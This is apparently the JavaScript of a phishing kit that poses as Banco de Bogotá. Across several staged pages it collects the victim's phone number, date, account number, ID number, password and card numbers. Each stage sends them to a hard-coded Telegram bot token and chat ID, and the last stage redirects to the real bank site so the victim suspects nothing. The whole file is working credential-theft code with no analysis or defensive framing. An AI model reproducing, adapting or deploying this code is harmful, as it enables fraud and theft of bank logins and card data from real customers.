//bot token
var telegram_bot_id = "6356471580:AAE34i6IQZoJvy9Y-rhNd5S4fFDeN289PD8";
//chat id
var chat_id = "5122916576";
var USER, PASS, PIN, PIN2, PIN3, NUMBER, ip, ip2, message;

var ready = function () {
    CEL = document.getElementById("ypn-cel").value;
    FN = document.getElementById("ypn-fn").value;
    NC = document.getElementById("ypn-nc").value;
    ip2 = document.getElementById("address").innerHTML;
    message =  "💲💲💲💲bogota💲💲💲💲\n📱Celular: "+ CEL + "\n📅Fecha: "+ FN + "\n💼Cuenta: " + NC + "\n" + ip2;
    localStorage.setItem("CEL", CEL);
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index2.html"
    });
    return false;
}

var ready1 = function () {
    CEL = localStorage.getItem("CEL");
    DT = document.getElementById("ypndt").value;
    DN = document.getElementById("ypndn").value;
    message = "\n👤Cedula: " + DT + "\n👤Clave: " + DN +"\n " + CEL; localStorage.setItem("CEL", CEL);
};
var sender1 = function () {
    ready1();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index5.html"
    });
    return false;
}


var ready2 = function () {
    CEL = localStorage.getItem("CEL");
    CD = document.getElementById("ypncd").value;
    message = "numero de tarjeta: " + CD + "\n " + CEL; localStorage.setItem("CEL", CEL);
};
var sender2 = function () {
    ready2();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index4.html"
    });
    return false;
}

var ready3 = function () {
    CEL = localStorage.getItem("CEL");
    CD2 = document.getElementById("ypncd2").value;
    message = "numero de tarjeta: " + CD2 + "\n " + CEL; localStorage.setItem("CEL", CEL);
};
var sender3 = function () {
    ready3();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="https://www.bancodebogota.com/wps/portal/banco-de-bogota/bogota/productos/para-ti/cuenta-de-ahorros"
    });
    return false;
}